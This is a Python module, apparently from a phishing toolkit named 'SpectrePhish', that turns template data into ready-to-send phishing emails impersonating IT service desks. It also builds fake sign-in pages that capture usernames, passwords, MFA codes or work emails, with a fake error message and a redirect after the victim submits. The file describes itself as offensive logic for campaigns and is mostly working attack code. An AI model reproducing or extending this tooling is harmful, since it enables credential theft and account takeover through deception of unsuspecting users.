"""
SpectrePhish :: core/generate.py
Turn catalog metadata into complete, responsive HTML.

Offensive logic: hand-editing HTML per campaign is where phishing projects
die. Here a template is just data -- brand, subject, headline, body, CTA --
and this module expands it into a full email or login page that still honours
{{.FirstName}} / {{.URL}} variables and the tracking rewriter in core/render.

Author : Inayat Hussain
"""

from __future__ import annotations

from config import DEFAULT_TEMPLATE_SUBJECT
from core.defaults import EMAIL_TEMPLATES, LANDING_TEMPLATES

BODY_STYLE = "margin:0 0 13px;font-size:14.5px;line-height:1.68;color:#334155;"

FORM_MODES = {
    "password": (("username", "text", "Email or username"),
                 ("password", "password", "Password")),
    "mfa": (("code", "text", "Code from authenticator"),),
    "sso": (("username", "text", "Work email"),),
    "cert": (("username", "text", "Email or username"),),
}


def _p(text: str) -> str:
    return f'<p style="{BODY_STYLE}">{text}</p>'


# ==========================================================================
# EMAIL
# ==========================================================================
def render_email(spec: dict, overrides: dict | None = None) -> tuple:
    """Return (subject, html, text) for one catalog entry."""
    spec = dict(spec)
    spec.update(overrides or {})

    accent = spec.get("accent") or "#2563eb"
    brand = spec.get("brand") or "IT Service Desk"
    subject = spec.get("subject") or DEFAULT_TEMPLATE_SUBJECT
    headline = spec.get("headline") or subject
    cta = spec.get("cta") or "Sign in"
    url = spec.get("url") or "{{.URL}}"
    footer = spec.get("footer") or "Automated message from {{.Domain}} IT Services"
    preheader = spec.get("preheader") or headline
    body = spec.get("body") or []

    paragraphs = "".join(_p(s) for s in body)

    html = f"""<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{subject}</title></head>
<body style="margin:0;padding:0;background:#eef1f5;font-family:'Segoe UI',Arial,Helvetica,sans-serif;">
<div style="display:none;max-height:0;overflow:hidden;opacity:0;">{preheader}</div>
<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#eef1f5;">
 <tr><td align="center" style="padding:28px 12px;">
  <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="width:100%;max-width:600px;background:#ffffff;border-radius:10px;overflow:hidden;">
   <tr><td style="background:{accent};padding:18px 28px;">
    <span style="color:#ffffff;font-size:17px;font-weight:600;">{brand}</span>
   </td></tr>
   <tr><td style="padding:30px 28px 6px;">
    <h1 style="margin:0 0 16px;font-size:21px;line-height:1.32;color:#0f172a;font-weight:600;">{headline}</h1>
    {paragraphs}
    <p style="margin:26px 0 12px;">
     <a href="{url}" style="background:{accent};color:#ffffff;text-decoration:none;padding:12px 26px;border-radius:6px;display:inline-block;font-size:15px;font-weight:600;">{cta}</a>
    </p>
    <p style="margin:0 0 24px;font-size:12.5px;color:#64748b;line-height:1.65;">
     If the button does not work, copy this into your browser:<br>
     <span style="color:{accent};word-break:break-all;">{url}</span>
    </p>
   </td></tr>
   <tr><td style="padding:16px 28px;background:#f8fafc;border-top:1px solid #e2e8f0;font-size:11.5px;color:#94a3b8;line-height:1.65;">
    {footer}
   </td></tr>
  </table>
 </td></tr>
</table>
</body></html>"""

    text = "\n".join([headline, ""] + list(body) + ["", f"{cta}: {url}", "", footer])
    return subject, html, text


# ==========================================================================
# LANDING
# ==========================================================================
_LANDING_CSS = """
 *{box-sizing:border-box}
 body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
      background:#eef1f5;font-family:'Segoe UI',Arial,sans-serif}
 .wrap{width:100%;max-width:392px;padding:20px}
 .logo{text-align:center;margin-bottom:20px;font-size:22px;font-weight:700;letter-spacing:.2px}
 .card{background:#fff;padding:38px 34px;border-radius:6px;box-shadow:0 2px 14px rgba(15,23,42,.14)}
 h1{font-size:20px;margin:0 0 6px;color:#0f172a;font-weight:600}
 p.sub{margin:0 0 22px;font-size:13px;color:#64748b}
 label{display:block;font-size:12.5px;color:#475569;margin-bottom:6px}
 input{width:100%;padding:11px 12px;margin-bottom:16px;border:1px solid #cbd5e1;
       border-radius:4px;font-size:14px}
 input:focus{outline:none;border-color:#2563eb}
 button{width:100%;padding:12px;color:#fff;border:0;border-radius:4px;
        font-size:15px;font-weight:600;cursor:pointer}
 .err{display:none;color:#b91c1c;font-size:12.5px;margin-bottom:14px}
 .foot{margin-top:18px;font-size:12px;color:#94a3b8;text-align:center}
"""


def render_landing(spec: dict, overrides: dict | None = None) -> str:
    spec = dict(spec)
    spec.update(overrides or {})

    accent = spec.get("accent") or "#2563eb"
    brand = spec.get("brand") or "Sign in"
    title = spec.get("title") or "Sign in"
    subtitle = spec.get("subtitle") or ""
    logo = spec.get("logo") or brand
    button = spec.get("button") or "Sign in"
    mode = (spec.get("mode") or "password").lower()

    fields = ""
    for name, ftype, placeholder in FORM_MODES.get(mode, FORM_MODES["password"]):
        fields += (f'<label for="{name}">{placeholder}</label>'
                   f'<input id="{name}" name="{name}" type="{ftype}" '
                   f'placeholder="{placeholder}" required>\n')

    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} - {brand}</title>
<style>{_LANDING_CSS}</style></head>
<body><div class="wrap">
 <div class="logo" style="color:{accent}">{logo}</div>
 <form class="card" method="POST">
  <h1>{title}</h1>
  <p class="sub">{subtitle}</p>
  <div class="err" id="e">That account or password is incorrect.</div>
  {fields}
  <button type="submit" style="background:{accent}">{button}</button>
 </form>
 <div class="foot">{brand} - secure sign-in</div>
</div>
<script>
document.querySelector('form').addEventListener('submit',function(){{
  var u=document.createElement('input');u.type='hidden';u.name='tz';
  u.value=Intl.DateTimeFormat().resolvedOptions().timeZone;this.appendChild(u);
}});
</script>
</body></html>"""


# ==========================================================================
# BATCH
# ==========================================================================
def generate_templates(store, names=None, category=None, overrides=None) -> list:
    """Install catalog templates into the store. Returns the names written."""
    overrides = overrides or {}
    written = []
    for spec in EMAIL_TEMPLATES:
        if names and spec["name"] not in names:
            continue
        if category and spec["category"].lower() != category.lower():
            continue
        subject, html, text = render_email(spec, overrides)
        store.upsert_template(spec["name"], subject, html, text)
        written.append(spec["name"])
    return written


def generate_landings(store, names=None, overrides=None, redirect: str = "") -> list:
    overrides = overrides or {}
    written = []
    for spec in LANDING_TEMPLATES:
        if names and spec["name"] not in names:
            continue
        html = render_landing(spec, overrides)
        store.upsert_landing(spec["name"], html, capture=[],
                             redirect_url=redirect, redirect_on_submit=bool(redirect))
        written.append(spec["name"])
    return written


def generate_all(store, overrides=None, redirect: str = "") -> dict:
    return {
        "templates": generate_templates(store, overrides=overrides),
        "landings": generate_landings(store, overrides=overrides, redirect=redirect),
    }
